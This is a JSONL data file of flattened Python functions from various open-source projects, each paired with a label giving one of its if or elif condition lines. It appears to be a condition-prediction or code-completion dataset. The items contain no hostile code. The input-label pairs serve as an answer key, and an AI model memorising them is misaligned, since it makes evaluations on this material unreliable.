{"input": "def test_region_redirects_multiple_requests(self): try: response = self.client.list_objects(Bucket=self.bucket_name) self.assertEqual(response[\"ResponseMetadata\"][\"HTTPStatusCode\"], 200) second_response = self.client.list_objects(Bucket=self.bucket_name) self.assertEqual(second_response[\"ResponseMetadata\"][\"HTTPStatusCode\"], 200) except ClientError as e: error = e.response[\"Error\"].get(\"Code\", None) if error == \"PermanentRedirect\": self.fail(\"S3 client failed to redirect to the proper region.\")", "label": "if error == \"PermanentRedirect\" :"}
{"input": "def get_action_type(action_space): \"\"\"Method to get the action type to choose prob. dist. to sample actions from NN logits output\"\"\" if isinstance(action_space, spaces.Box): shape = action_space.shape assert len(shape) == 1 if shape[0] == 1: return \"continuous\" else: return \"multi_continuous\" elif isinstance(action_space, spaces.Discrete): return \"discrete\" elif isinstance(action_space, spaces.MultiDiscrete): return \"multi_discrete\" elif isinstance(action_space, spaces.MultiBinary): return \"multi_binary\" else: raise NotImplementedError", "label": "if shape [ 0 ] == 1 :"}
{"input": "def remove_stale_sockets(self): with self.lock: if self.opts.max_idle_time_ms is not None: for sock_info in self.sockets.copy(): age = _time() - sock_info.last_checkout if age > self.opts.max_idle_time_ms: self.sockets.remove(sock_info) sock_info.close() while len(self.sockets) + self.active_sockets < self.opts.min_pool_size: sock_info = self.connect() with self.lock: self.sockets.add(sock_info)", "label": "if self . opts . max_idle_time_ms is not None :"}
{"input": "def _setReadyState(self, state: str) -> None: if state != self.__readyState: self.__log_debug(\"- %s -> %s\", self.__readyState, state) self.__readyState = state if state == \"open\": self.emit(\"open\") elif state == \"closed\": self.emit(\"close\") # no more events will be emitted, so remove all event listeners # to facilitate garbage collection. self.remove_all_listeners()", "label": "elif state == \"closed\" :"}
{"input": "def currentLevel(self): currentStr = \"\" for stackType, stackValue in self.stackVals: if stackType == \"dict\": if isinstance(stackValue, str): currentStr += \"['\" + stackValue + \"']\" else: # numeric key... currentStr += \"[\" + str(stackValue) + \"]\" elif stackType == \"listLike\": currentStr += \"[\" + str(stackValue) + \"]\" elif stackType == \"getattr\": currentStr += \".__getattribute__('\" + stackValue + \"')\" else: raise Exception(f\"Cannot get attribute of type {stackType}\") return currentStr", "label": "if stackType == \"dict\" :"}
{"input": "def filter_latest_pkgs(pkgs): pkgname2latest = {} for x in pkgs: pkgname = core.normalize_pkgname(x.pkgname) if pkgname not in pkgname2latest: pkgname2latest[pkgname] = x elif x.parsed_version > pkgname2latest[pkgname].parsed_version: pkgname2latest[pkgname] = x return pkgname2latest.values()", "label": "if pkgname not in pkgname2latest :"}
{"input": "def test_url_invalid_set(): for line in URL_INVALID_TESTS.split(\"\\n\"): # strip line, skip over empty lines line = line.strip() if line == \"\": continue # skip over comments match = COMMENT.match(line) if match: continue mbox = address.parse(line, strict=True) assert_equal(mbox, None)", "label": "if match :"}
{"input": "def check_block(cls, block): if ( len(block) == 4 and block[0][0] and block[0][0][0] == \"@\" and block[2][0] and block[2][0][0] == \"+\" and block[1][0] ): # Check the sequence line, make sure it contains only G/C/A/T/N match = cls.bases_regexp.match(block[1][0]) if match: start, end = match.span() if (end - start) == len(block[1][0]): return True return False", "label": "if match :"}
{"input": "def load_from_file(self, filename): self._filename = filename if os.path.exists(filename): if not os.path.isfile(filename): raise IOError(\"%s exists and is not a file\" % filename) with open(filename, \"r\") as f: self._properties = json.load(f) else: mkpath(os.path.dirname(filename)) self.save_to_file()", "label": "if not os . path . isfile ( filename ) :"}
{"input": "def add_system_info_creds_to_config(creds): for user in creds: ConfigService.creds_add_username(creds[user][\"username\"]) if \"password\" in creds[user] and creds[user][\"password\"]: ConfigService.creds_add_password(creds[user][\"password\"]) if \"lm_hash\" in creds[user] and creds[user][\"lm_hash\"]: ConfigService.creds_add_lm_hash(creds[user][\"lm_hash\"]) if \"ntlm_hash\" in creds[user] and creds[user][\"ntlm_hash\"]: ConfigService.creds_add_ntlm_hash(creds[user][\"ntlm_hash\"])", "label": "if \"lm_hash\" in creds [ user ] and creds [ user ] [ \"lm_hash\" ] :"}
{"input": "def line_number(self): if self._line_range: line_range = self._line_range if line_range.stop - line_range.start > 1: return \"%03d-%03d\" % (line_range.start, line_range.stop - 1) else: return \"%03d\" % line_range.start", "label": "if line_range . stop - line_range . start > 1 :"}
{"input": "def smooth(self, y, x=None, weights=None): if self.method == \"target_df\": if hasattr(self, \"pen\"): self.fit(y, x=x, weights=weights, pen=self.pen) else: self.fit_target_df(y, x=x, weights=weights, df=self.target_df) elif self.method == \"optimize_gcv\": self.fit_optimize_gcv(y, x=x, weights=weights)", "label": "if hasattr ( self , \"pen\" ) :"}
{"input": "def dict_from_cursor(data=None, keys=None): filtered_dict = {} # Convert Uids to str data = bson_dumps(data) python_dict = json.loads(data) for key in keys: value = python_dict.get(key) if type(value) is dict: # Try to get mongo_id mongo_id = value.get(\"$oid\") if mongo_id: value = mongo_id if key == \"_id\": key = \"id\" filtered_dict[key] = value return filtered_dict", "label": "if mongo_id :"}
{"input": "def pytest_plugin_registered(self, plugin): nodeid = None try: p = py.path.local(plugin.__file__) except AttributeError: pass else: # construct the base nodeid which is later used to check # what fixtures are visible for particular tests (as denoted # by their test id) if p.basename.startswith(\"conftest.py\"): nodeid = p.dirpath().relto(self.config.rootdir) if p.sep != \"/\": nodeid = nodeid.replace(p.sep, \"/\") self.parsefactories(plugin, nodeid)", "label": "if p . sep != \"/\" :"}
{"input": "def _escape_unsafe_values(self, *values): # type: (str) -> Generator[str] \"\"\"Escape unsafe values (name, section name) for API version 2.10 and below\"\"\" for value in values: if value not in UNSAFE_NAMES_2_10: yield value else: self.task.log.info( \"Converting unsafe hyper parameter name/section '{}' to '{}'\".format( value, \"_\" + value ) ) yield \"_\" + value", "label": "if value not in UNSAFE_NAMES_2_10 :"}
{"input": "def _identifier_split(self, identifier): \"\"\"Return (name, start, end) string tuple from an identifier (PRIVATE).\"\"\" if \"/\" in identifier: name, start_end = identifier.rsplit(\"/\", 1) if start_end.count(\"-\") == 1: try: start, end = start_end.split(\"-\") return name, int(start), int(end) except ValueError: # Non-integers after final '/' - fall through pass return identifier, None, None", "label": "if start_end . count ( \"-\" ) == 1 :"}
{"input": "def _complete_initial_layout(self): \"\"\"Finish initial layout; called after toplevel win is positioned\"\"\" # Init tool group sizes by setting vpaned positions for paned in self._get_paneds(): if paned._initial_divider_position: pos = paned._initial_divider_position GLib.idle_add(paned.set_position, pos)", "label": "if paned . _initial_divider_position :"}
{"input": "def _init_mapping(self, result): for wamp_uri, full_name in result.items(): for prefix in self.PREFIXES: if not full_name.startswith(prefix): continue short_name = full_name[len(prefix) :] self._mapping[short_name] = wamp_uri", "label": "if not full_name . startswith ( prefix ) :"}
{"input": "def get_bounce_message(reason, ses_data, details): if reason != \"bounce\": return if ses_data: bouncedRecipients = ses_data.get(\"bounce\", {}).get(\"bouncedRecipients\") if bouncedRecipients: recipient = bouncedRecipients[0] return recipient.get(\"diagnosticCode\") or recipient.get(\"status\") elif details: return details", "label": "if bouncedRecipients :"}
{"input": "def do_If(self, node, elif_flag=False): self.div(\"statement\") self.keyword(\"elif\" if elif_flag else \"if\") self.visit(node.test) self.colon() self.div_body(node.body) if node.orelse: node1 = node.orelse[0] if isinstance(node1, ast.If) and len(node.orelse) == 1: self.do_If(node1, elif_flag=True) else: self.keyword(\"else\") self.colon() self.div_body(node.orelse) self.end_div(\"statement\")", "label": "if isinstance ( node1 , ast . If ) and len ( node . orelse ) == 1 :"}
{"input": "def matches(self, filepath): matched = False parent_path = os.path.dirname(filepath) parent_path_dirs = split_path(parent_path) for pattern in self.patterns: negative = pattern.exclusion match = pattern.match(filepath) if not match and parent_path != \"\": if len(pattern.dirs) <= len(parent_path_dirs): match = pattern.match( os.path.sep.join(parent_path_dirs[: len(pattern.dirs)]) ) if match: matched = not negative return matched", "label": "if match :"}
{"input": "def test_11_wait_for_first_reboot_with_bhyve(): if update_version is None: pytest.skip(\"No update found\") elif download_failed is True: pytest.skip(f\"Downloading {selected_trains} failed\") elif reboot is False: pytest.skip(\"Reboot is False skip\") else: if vm_name is None: pytest.skip(\"skip no vm_name\") else: while vm_state(vm_name) != \"stopped\": sleep(5) assert vm_start(vm_name) is True sleep(1)", "label": "if vm_name is None :"}
{"input": "def _check_network_private(test_network): test_net = ipaddress.IPNetwork(test_network) test_start = test_net.network test_end = test_net.broadcast for network in settings.vpn.safe_priv_subnets: network = ipaddress.IPNetwork(network) net_start = network.network net_end = network.broadcast if test_start >= net_start and test_end <= net_end: return True return False", "label": "if test_start >= net_start and test_end <= net_end :"}
{"input": "def remove_stale_sockets(self): with self.lock: if self.opts.max_idle_time_ms is not None: for sock_info in self.sockets.copy(): age = _time() - sock_info.last_checkout if age > self.opts.max_idle_time_ms: self.sockets.remove(sock_info) sock_info.close() while len(self.sockets) + self.active_sockets < self.opts.min_pool_size: sock_info = self.connect() with self.lock: self.sockets.add(sock_info)", "label": "if age > self . opts . max_idle_time_ms :"}
{"input": "def hint(self, button): \"\"\"As hilight, but marks GTK Button as well\"\"\" active = None for b in self.button_widgets.values(): if b.widget.get_sensitive(): b.widget.set_state(Gtk.StateType.NORMAL) if b.name == button: active = b.widget if active is not None: active.set_state(Gtk.StateType.ACTIVE) self.hilight(button)", "label": "if b . name == button :"}
{"input": "def post_process(self, retcode): if not self.ok_codes: return retcode for code in self.ok_codes: self.log.debug(\"Comparing %s with %s codes\", code, retcode) if code == int(retcode): self.log.info(\"Exit code %s was changed to 0 by RCAssert plugin\", code) return 0 self.log.info( \"Changing exit code to %s because RCAssert pass list was unsatisfied\", self.fail_code, ) return self.fail_code", "label": "if code == int ( retcode ) :"}
{"input": "def get_form_kwargs(self): result = super().get_form_kwargs() if self.request.method != \"POST\": if self.initial: # When going from other form (for example ZIP import) result.pop(\"data\", None) result.pop(\"files\", None) if self.has_all_fields() and not self.empty_form: result[\"data\"] = self.request.GET return result", "label": "if self . has_all_fields ( ) and not self . empty_form :"}
{"input": "def transform_first_chunk(self, headers, chunk, finishing): if self._chunking: # No need to chunk the output if a Content-Length is specified if \"Content-Length\" in headers or \"Transfer-Encoding\" in headers: self._chunking = False else: headers[\"Transfer-Encoding\"] = \"chunked\" chunk = self.transform_chunk(chunk, finishing) return headers, chunk", "label": "if \"Content-Length\" in headers or \"Transfer-Encoding\" in headers :"}
{"input": "def copy_stream(self, in_fd, out_fd, length=2 ** 64): total = 0 while 1: available_to_read = min(length - total, self.BUFFERSIZE) data = in_fd.read(available_to_read) if not data: break out_fd.write(data) total += len(data) self.session.report_progress(\"Reading %s @ %#x\", in_fd.urn, total)", "label": "if not data :"}
{"input": "def _trim_steps(self, num_steps): \"\"\"Trims a given number of steps from the end of the sequence.\"\"\" steps_trimmed = 0 for i in reversed(range(len(self._events))): if self._events[i].event_type == PolyphonicEvent.STEP_END: if steps_trimmed == num_steps: del self._events[i + 1 :] break steps_trimmed += 1 elif i == 0: self._events = [ PolyphonicEvent(event_type=PolyphonicEvent.START, pitch=None) ] break", "label": "if self . _events [ i ] . event_type == PolyphonicEvent . STEP_END :"}
{"input": "def get_img_file(dir_name: str) -> list: \"\"\"Get all image file paths in several directories which have the same parent directory.\"\"\" images = [] for parent, _, filenames in os.walk(dir_name): for filename in filenames: if not is_image_file(filename): continue img_path = os.path.join(parent, filename) images.append(img_path) return images", "label": "if not is_image_file ( filename ) :"}
{"input": "def get_agg_title(clause): attr = str(clause.attribute) if clause.aggregation is None: if len(attr) > 25: return attr[:15] + \"...\" + attr[-10:] return f\"{attr}\" elif attr == \"Record\": return f\"Number of Records\" else: if len(attr) > 15: return f\"{clause._aggregation_name.capitalize()} of {attr[:15]}...\" return f\"{clause._aggregation_name.capitalize()} of {attr}\"", "label": "if len ( attr ) > 25 :"}
{"input": "def _check_realign(data): \"\"\"Check for realignment, which is not supported in GATK4\"\"\" if \"gatk4\" not in data[\"algorithm\"].get(\"tools_off\", []) and not \"gatk4\" == data[ \"algorithm\" ].get(\"tools_off\"): if data[\"algorithm\"].get(\"realign\"): raise ValueError( \"In sample %s, realign specified but it is not supported for GATK4. \" \"Realignment is generally not necessary for most variant callers.\" % (dd.get_sample_name(data)) )", "label": "if data [ \"algorithm\" ] . get ( \"realign\" ) :"}
{"input": "def __call__(self, target): if \"weights\" not in target.temp: return True targets = target.temp[\"weights\"] for cname in target.children: if cname in targets: c = target.children[cname] deviation = abs((c.weight - targets[cname]) / targets[cname]) if deviation > self.tolerance: return True if \"cash\" in target.temp: cash_deviation = abs( (target.capital - targets.value) / targets.value - target.temp[\"cash\"] ) if cash_deviation > self.tolerance: return True return False", "label": "if deviation > self . tolerance :"}
{"input": "def status_string(self): if not self.live: if self.expired: return _(\"expired\") elif self.approved_schedule: return _(\"scheduled\") elif self.workflow_in_progress: return _(\"in moderation\") else: return _(\"draft\") else: if self.approved_schedule: return _(\"live + scheduled\") elif self.workflow_in_progress: return _(\"live + in moderation\") elif self.has_unpublished_changes: return _(\"live + draft\") else: return _(\"live\")", "label": "if self . expired :"}
{"input": "def __getitem__(self, item): if item == \"EntityId\": if \"EntityId\" not in self: if self.use_uuid: super(PlayerDict, self).__setitem__( \"EntityId\", self.get_name_from_uuid() ) else: super(PlayerDict, self).__setitem__(\"EntityId\", self._name) return super(PlayerDict, self).__getitem__(item)", "label": "if \"EntityId\" not in self :"}
{"input": "def _to_num_bytes(java_mem_str): if isinstance(java_mem_str, string_types): for i, magnitude in enumerate((\"k\", \"m\", \"g\", \"t\"), start=1): if java_mem_str.lower().endswith(magnitude): return int(java_mem_str[:-1]) * 1024 ** i return int(java_mem_str)", "label": "if java_mem_str . lower ( ) . endswith ( magnitude ) :"}
{"input": "def test_layout_instantiate_subplots(self): layout = ( Curve(range(10)) + Curve(range(10)) + Image(np.random.rand(10, 10)) + Curve(range(10)) + Curve(range(10)) ) plot = mpl_renderer.get_plot(layout) positions = [(0, 0), (0, 1), (0, 2), (0, 3), (1, 0)] self.assertEqual(sorted(plot.subplots.keys()), positions) for i, pos in enumerate(positions): adjoint = plot.subplots[pos] if \"main\" in adjoint.subplots: self.assertEqual(adjoint.subplots[\"main\"].layout_num, i + 1)", "label": "if \"main\" in adjoint . subplots :"}
{"input": "def __str__(self): width = int(os.environ.get(\"COLUMNS\", \"80\")) s = ( self.getSynopsis() + \"\\n\" + \"(use 'tahoe --help' to view global options)\\n\" + \"\\n\" + self.getUsage() ) if self.description: s += \"\\n\" + wrap_paragraphs(self.description, width) + \"\\n\" if self.description_unwrapped: du = textwrap.dedent(self.description_unwrapped) if du.startswith(\"\\n\"): du = du[1:] s += \"\\n\" + du + \"\\n\" return s", "label": "if du . startswith ( \"\\n\" ) :"}
{"input": "def open(self, path, mode=\"rb\", cryptoType=-1, cryptoKey=-1, cryptoCounter=-1): if path is not None: if self.isOpen(): self.close() if isinstance(path, str): self.f = open(path, mode) self._path = path self.f.seek(0, 2) self.size = self.f.tell() self.f.seek(0, 0) elif isinstance(path, BaseFile): self.f = path self.size = path.size else: raise IOError(\"Invalid file parameter\") self.setupCrypto(cryptoType, cryptoKey, cryptoCounter)", "label": "if self . isOpen ( ) :"}
{"input": "def open_spotify(): if sys.platform == \"win32\": if getwindowtitle() == \"\": path = os.getenv(\"APPDATA\") + \"\\Spotify\\Spotify.exe\" subprocess.Popen(path) else: pass elif sys.platform == \"linux\": if getwindowtitle() == \"\": subprocess.Popen(\"spotify\") else: pass elif sys.platform == \"darwin\": # I don't have a mac so I don't know if this actually works # If it does, please let me know, if it doesn't please fix it :) if getwindowtitle() == \"\": subprocess.Popen(\"open -a Spotify\") else: pass else: pass", "label": "if getwindowtitle ( ) == \"\" :"}
{"input": "def get_search_columns_list(self) -> List[str]: ret_lst = list() for col_name in self.get_columns_list(): if not self.is_relation(col_name): tmp_prop = self.get_property_first_col(col_name).name if ( (not self.is_pk(tmp_prop)) and (not self.is_fk(tmp_prop)) and (not self.is_image(col_name)) and (not self.is_file(col_name)) ): ret_lst.append(col_name) else: ret_lst.append(col_name) return ret_lst", "label": "if not self . is_relation ( col_name ) :"}
{"input": "def get_artist(self, name): artist = self.artists.get(name) if not artist: if self.use_db: try: artist = q(m.Artist).filter_by(name=name).one() except NoResultFound: pass if artist and self.ram_cache: self.add_artist(artist) return artist", "label": "if self . use_db :"}
{"input": "def _find_glob_metadata(cur_files, metadata): md_key = None for check_key in metadata.keys(): matches = 0 if \"*\" in check_key: for fname in cur_files: if fnmatch.fnmatch(fname, \"*/%s\" % check_key): matches += 1 if matches == len(cur_files): md_key = check_key break if md_key: return metadata[md_key]", "label": "if \"*\" in check_key :"}
{"input": "def extract_copy( data: bytearray, mem: bytearray, memstart: int, datastart: int, size: int ): for i in range(size): if datastart + i < len(data): mem[memstart + i] = data[datastart + i] else: mem[memstart + i] = 0", "label": "if datastart + i < len ( data ) :"}
{"input": "def rpc_get_image(self, sender, image_hash): self.router.addContact(sender) try: if len(image_hash) != 20: self.log.warning(\"Image hash is not 20 characters %s\" % image_hash) raise Exception(\"Invalid image hash\") self.log.info(\"serving image %s to %s\" % (image_hash.encode(\"hex\"), sender)) with open(self.db.filemap.get_file(image_hash.encode(\"hex\")), \"rb\") as filename: image = filename.read() return [image] except Exception: self.log.warning(\"could not find image %s\" % image_hash[:20].encode(\"hex\")) return None", "label": "if len ( image_hash ) != 20 :"}
{"input": "def preprocess_mnist(raw, withlabel, ndim, scale, image_dtype, label_dtype, rgb_format): images = raw[\"x\"] if ndim == 2: images = images.reshape(-1, 28, 28) elif ndim == 3: images = images.reshape(-1, 1, 28, 28) if rgb_format: images = np.broadcast_to(images, (len(images), 3) + images.shape[2:]) elif ndim != 1: raise ValueError(\"invalid ndim for MNIST dataset\") images = images.astype(image_dtype) images *= scale / 255.0 if withlabel: labels = raw[\"y\"].astype(label_dtype) return images, labels return images", "label": "if rgb_format :"}
{"input": "def get_tokens_unprocessed(self, text): for index, token, value in RegexLexer.get_tokens_unprocessed(self, text): if token is Name: if self.stdlibhighlighting and value in self.stdlib_types: token = Keyword.Type elif self.c99highlighting and value in self.c99_types: token = Keyword.Type elif self.platformhighlighting and value in self.linux_types: token = Keyword.Type yield index, token, value", "label": "elif self . platformhighlighting and value in self . linux_types :"}
{"input": "def _match(self, pattern, input_string, context=None): for index in find_all(input_string, pattern, **self._kwargs): match = Match( index, index + len(pattern), pattern=self, input_string=input_string, **self._match_kwargs ) if match: yield match", "label": "if match :"}
{"input": "def https_open(self, req): try: return self.do_open(do_connection, req) except Exception as err_msg: try: error_msg = str(err_msg.args[0]).split(\"] \")[1] + \".\" except IndexError: error_msg = str(err_msg.args[0]) + \".\" if settings.INIT_TEST == True: if settings.VERBOSITY_LEVEL < 2: print(settings.FAIL_STATUS) else: if settings.VERBOSITY_LEVEL < 1: print(\"\") print(settings.print_critical_msg(error_msg)) raise SystemExit()", "label": "if settings . VERBOSITY_LEVEL < 1 :"}
{"input": "def recursive_select(tag): if self._select_debug: print( ' Calling select(\"%s\") recursively on %s %s' % (next_token, tag.name, tag.attrs) ) print(\"-\" * 40) for i in tag.select(next_token, recursive_candidate_generator): if self._select_debug: print(\"(Recursive select picked up candidate %s %s)\" % (i.name, i.attrs)) yield i if self._select_debug: print(\"-\" * 40)", "label": "if self . _select_debug :"}
{"input": "def detect(self, agent, result): # -> True/None word = self.checkWords(agent) if word: result[self.info_type] = dict(name=self.name) result[\"bot\"] = self.bot version = self.getVersion(agent, word) if version: result[self.info_type][\"version\"] = version if self.platform: result[\"platform\"] = {\"name\": self.platform, \"version\": version} return True", "label": "if self . platform :"}
{"input": "def is_display_marc(data): if data.startswith( \"(Length implementation at offset 22 should hold a digit. Assuming 0)\" ): return True try: lines = data.split(\"\\n\") leader = lines[0] assert re_leader.match(leader) for line in lines[1:]: if line.startswith(\"00\"): assert re_control.match(line) else: assert re_data.match(line) return True except AssertionError: return False", "label": "if line . startswith ( \"00\" ) :"}
{"input": "def nodejslib(self): if not hasattr(self, \"_nodejslib\"): for lib in self.libs: if lib.name == \"node.js stdlib\": self._nodejslib = lib break else: self._nodejslib = None return self._nodejslib", "label": "if lib . name == \"node.js stdlib\" :"}
{"input": "def get(self, key, default=None, type=None): for d in self.dicts: if key in d: if type is not None: try: return type(d[key]) except ValueError: continue return d[key] return default", "label": "if key in d :"}
{"input": "def add_callers(target, source): \"\"\"Combine two caller lists in a single list.\"\"\" new_callers = {} for func, caller in target.items(): new_callers[func] = caller for func, caller in source.items(): if func in new_callers: if isinstance(caller, tuple): # format used by cProfile new_callers[func] = tuple( [i[0] + i[1] for i in zip(caller, new_callers[func])] ) else: # format used by profile new_callers[func] += caller else: new_callers[func] = caller return new_callers", "label": "if isinstance ( caller , tuple ) :"}
{"input": "def work(src, vsi_dest): gdal.Mkdir(vsi_dest, 0o777) for item in src.iterdir(): item_vsi_dest = os.path.join(vsi_dest, item.name) if item.is_dir(): work(item, item_vsi_dest) else: VsiFileSystem.copy_to(str(item), item_vsi_dest)", "label": "if item . is_dir ( ) :"}
{"input": "def __getitem__(self, key): if isinstance(key, raw_types.Qid): return self._operation_touching(key) elif isinstance(key, Iterable): qubits_to_keep = frozenset(key) ops_to_keep = tuple( op for op in self.operations if not qubits_to_keep.isdisjoint(frozenset(op.qubits)) ) return Moment(ops_to_keep)", "label": "if not qubits_to_keep . isdisjoint ( frozenset ( op . qubits ) )"}
{"input": "def mlt_version_is_greater_correct(test_version): runtime_ver = mlt_version.split(\".\") test_ver = test_version.split(\".\") if runtime_ver[0] > test_ver[0]: return True elif runtime_ver[0] == test_ver[0]: if runtime_ver[1] > test_ver[1]: return True elif runtime_ver[1] == test_ver[1]: if runtime_ver[2] > test_ver[2]: return True return False", "label": "if runtime_ver [ 1 ] > test_ver [ 1 ] :"}
{"input": "def populate(self, item): path = self.getItemPath(item) for name in sorted(os.listdir(path)): if name[0] == \".\": continue pathname = os.path.join(path, name) if os.path.isdir(pathname): item.addChild(name, True) elif name.lower().endswith(\".target\") and os.path.isfile(pathname): item.addChild(name, False)", "label": "if name [ 0 ] == \".\" :"}
{"input": "def runTests(self): \"\"\"Run tests\"\"\" # fire plugin hook runner = self._makeRunner() try: self.result = runner.run(self.test) except Exception as e: log.exception(\"Internal Error\") sys.stderr.write(\"Internal Error: runTests aborted: %s\\n\" % (e)) if self.exit: sys.exit(1) if self.exit: sys.exit(not self.result.wasSuccessful())", "label": "if self . exit :"}
{"input": "def __setitem__(self, key, value): \"\"\"Like :meth:`set` but also supports index/slice based setting.\"\"\" if isinstance(key, (slice, int)): if isinstance(key, int): value = [value] value = [ (_unicodify_header_value(k), _unicodify_header_value(v)) for (k, v) in value ] for (_, v) in value: self._validate_value(v) if isinstance(key, int): self._list[key] = value[0] else: self._list[key] = value else: self.set(key, value)", "label": "if isinstance ( key , int ) :"}
{"input": "def toggle_fullscreen_hide_tabbar(self): if self.is_fullscreen(): if self.settings.general.get_boolean(\"fullscreen-hide-tabbar\"): if self.guake and self.guake.notebook_manager: self.guake.notebook_manager.set_notebooks_tabbar_visible(False) else: if self.guake and self.guake.notebook_manager: v = self.settings.general.get_boolean(\"window-tabbar\") self.guake.notebook_manager.set_notebooks_tabbar_visible(v)", "label": "if self . settings . general . get_boolean ( \"fullscreen-hide-tabbar\" ) :"}
{"input": "def clear_doc(self, docname: str) -> None: for sChild in self._children: sChild.clear_doc(docname) if sChild.declaration and sChild.docname == docname: sChild.declaration = None sChild.docname = None sChild.line = None if sChild.siblingAbove is not None: sChild.siblingAbove.siblingBelow = sChild.siblingBelow if sChild.siblingBelow is not None: sChild.siblingBelow.siblingAbove = sChild.siblingAbove sChild.siblingAbove = None sChild.siblingBelow = None", "label": "if sChild . declaration and sChild . docname == docname :"}
{"input": "def visit_hierarchichttprequest(self, request): files = [] body_file = request.config.get(\"body-file\") if body_file: files.append(body_file) uploads = request.config.get(\"upload-files\", []) files.extend([x[\"path\"] for x in uploads if not has_variable_pattern(x[\"path\"])]) if \"jsr223\" in request.config: jsrs = request.config.get(\"jsr223\") if isinstance(jsrs, dict): jsrs = [jsrs] for jsr in jsrs: if \"script-file\" in jsr: files.append(jsr.get(\"script-file\")) return files", "label": "if isinstance ( jsrs , dict ) :"}
{"input": "def find_commands(management_dir): # Modified version of function from django/core/management/__init__.py. command_dir = os.path.join(management_dir, \"commands\") commands = [] try: for f in os.listdir(command_dir): if f.startswith(\"_\"): continue elif f.endswith(\".py\") and f[:-3] not in commands: commands.append(f[:-3]) elif f.endswith(\".pyc\") and f[:-4] not in commands: commands.append(f[:-4]) except OSError: pass return commands", "label": "elif f . endswith ( \".pyc\" ) and f [ : - 4 ] not in commands :"}
{"input": "def show_panel(panel_id): # Iterate positions to find where panel is and bring it to front. for position in _positions_names: pos_panel_ids = _get_position_panels(position) if len(pos_panel_ids) == 0: continue if len(pos_panel_ids) == 1: continue panel_widget = _get_panels_widgets_dict(gui.editor_window)[panel_id] notebook = _position_notebooks[position] for i in range(0, notebook.get_n_pages()): notebook_page = notebook.get_nth_page(i) if notebook_page == panel_widget: notebook.set_current_page(i)", "label": "if len ( pos_panel_ids ) == 1 :"}
{"input": "def is_cwl_record(d): \"\"\"Check if an input is a CWL record, from any level of nesting.\"\"\" if isinstance(d, dict): if d.get(\"type\") == \"record\": return d else: recs = list( filter(lambda x: x is not None, [is_cwl_record(v) for v in d.values()]) ) return recs[0] if recs else None else: return None", "label": "if d . get ( \"type\" ) == \"record\" :"}
{"input": "def _flags_data_(self, main_mod, model_paths, flags_dest): try: sys_path, mod_path = python_util.find_module(main_mod, model_paths) except ImportError as e: if os.getenv(\"NO_WARN_FLAGS_IMPORT\") != \"1\": self.log.warning(\"cannot import flags from %s: %s\", main_mod, e) return {} else: package = self._main_spec_package(main_mod) return self._flags_data_for_path(mod_path, package, sys_path, flags_dest)", "label": "if os . getenv ( \"NO_WARN_FLAGS_IMPORT\" ) != \"1\" :"}
{"input": "def __str__(self): messages = [self.__class__.__name__, \"(\"] annotation = self.annotation messages.append(self.annotation.surrounds_attribute or \"\") if annotation.tag_attributes: if annotation.surrounds_attribute: messages.append(\";\") for (f, ta, ea) in self.tag_data: messages += [ea, ': attribute \"', ta, '\"'] start, end = annotation.start_index, annotation.end_index messages.append(\", template[%s:%s])\" % (start, end)) return \"\".join(map(str, messages))", "label": "if annotation . surrounds_attribute :"}
{"input": "def _on_view_count_change(self, *args): with self.output: logger.debug(\"views: %d\", self.image.view_count) if self._dirty and self.image.view_count > 0: try: logger.debug(\"was dirty, and needs an update\") self.update() finally: self._dirty = False", "label": "if self . _dirty and self . image . view_count > 0 :"}
{"input": "def network_state(self, device): cmd = [\"tc\", \"qdisc\", \"show\", \"dev\", device] try: output = self.host_exec.run(cmd) # sloppy but good enough for now if \" delay \" in output: return NetworkState.SLOW if \" loss \" in output: return NetworkState.FLAKY if \" duplicate \" in output: return NetworkState.DUPLICATE return NetworkState.NORMAL except Exception: return NetworkState.UNKNOWN", "label": "if \" delay \" in output :"}
{"input": "def _remove(self, item): \"\"\"Internal removal of an item\"\"\" # Manage siblings when items are deleted for sibling in self.lines[self.lines.index(item) + 1 :]: if isinstance(sibling, CronItem): env = sibling.env sibling.env = item.env sibling.env.update(env) sibling.env.job = sibling break elif sibling == \"\": self.lines.remove(sibling) else: break self.crons.remove(item) self.lines.remove(item) return 1", "label": "if isinstance ( sibling , CronItem ) :"}
{"input": "def _get_transformations(self, current_text, indices_to_modify): transformed_texts = [] words = current_text.words for idx in indices_to_modify: word = words[idx] swap_idxs = list(set(range(len(words))) - {idx}) if swap_idxs: swap_idx = random.choice(swap_idxs) swapped_text = current_text.replace_word_at_index( idx, words[swap_idx] ).replace_word_at_index(swap_idx, word) transformed_texts.append(swapped_text) return transformed_texts", "label": "if swap_idxs :"}
{"input": "def _unlock_restarted_vms(self, pool_name): result = [] for vm in await self.middleware.call(\"vm.query\", [(\"autostart\", \"=\", True)]): for device in vm[\"devices\"]: if device[\"dtype\"] not in (\"DISK\", \"RAW\"): continue path = device[\"attributes\"].get(\"path\") if not path: continue if path.startswith(f\"/dev/zvol/{pool_name}/\") or path.startswith( f\"/mnt/{pool_name}/\" ): result.append(vm) break return result", "label": "if not path :"}
{"input": "def parse_literal_object(node): value = 0 unit = get_default_weight_unit() for field in node.fields: if field.name.value == \"value\": try: value = decimal.Decimal(field.value.value) except decimal.DecimalException: raise GraphQLError(f\"Unsupported value: {field.value.value}\") if field.name.value == \"unit\": unit = field.value.value return Weight(**{unit: value})", "label": "if field . name . value == \"unit\" :"}
{"input": "def _extract_level(self): \"\"\"Extract level and component if available (lazy).\"\"\" if self._level is None: split_tokens = self.split_tokens if not split_tokens: self._level = False self._component = False return x = ( self.log_levels.index(split_tokens[1]) if split_tokens[1] in self.log_levels else None ) if x is not None: self._level = split_tokens[1] self._component = split_tokens[2] else: self._level = False self._component = False", "label": "if split_tokens [ 1 ] in self . log_levels"}
{"input": "def _average_import_time(n: int, module: Text) -> float: total = 0 for _ in range(n): lines = subprocess.getoutput( f'{sys.executable} -X importtime -c \"import {module}\"' ).splitlines() parts = lines[-1].split(\"|\") if parts[-1].strip() != module: raise Exception(f\"Import time not found for {module}.\") total += int(parts[1].strip()) / 1000000 return total / n", "label": "if parts [ - 1 ] . strip ( ) != module :"}
{"input": "def send_preamble(self): \"\"\"Transmit version/status/date/server, via self._write()\"\"\" if self.origin_server: if self.client_is_modern(): self._write(\"HTTP/%s %s\\r\\n\" % (self.http_version, self.status)) if not self.headers.has_key(\"Date\"): self._write(\"Date: %s\\r\\n\" % time.asctime(time.gmtime(time.time()))) if self.server_software and not self.headers.has_key(\"Server\"): self._write(\"Server: %s\\r\\n\" % self.server_software) else: self._write(\"Status: %s\\r\\n\" % self.status)", "label": "if self . server_software and not self . headers . has_key ( \"Server\" ) :"}
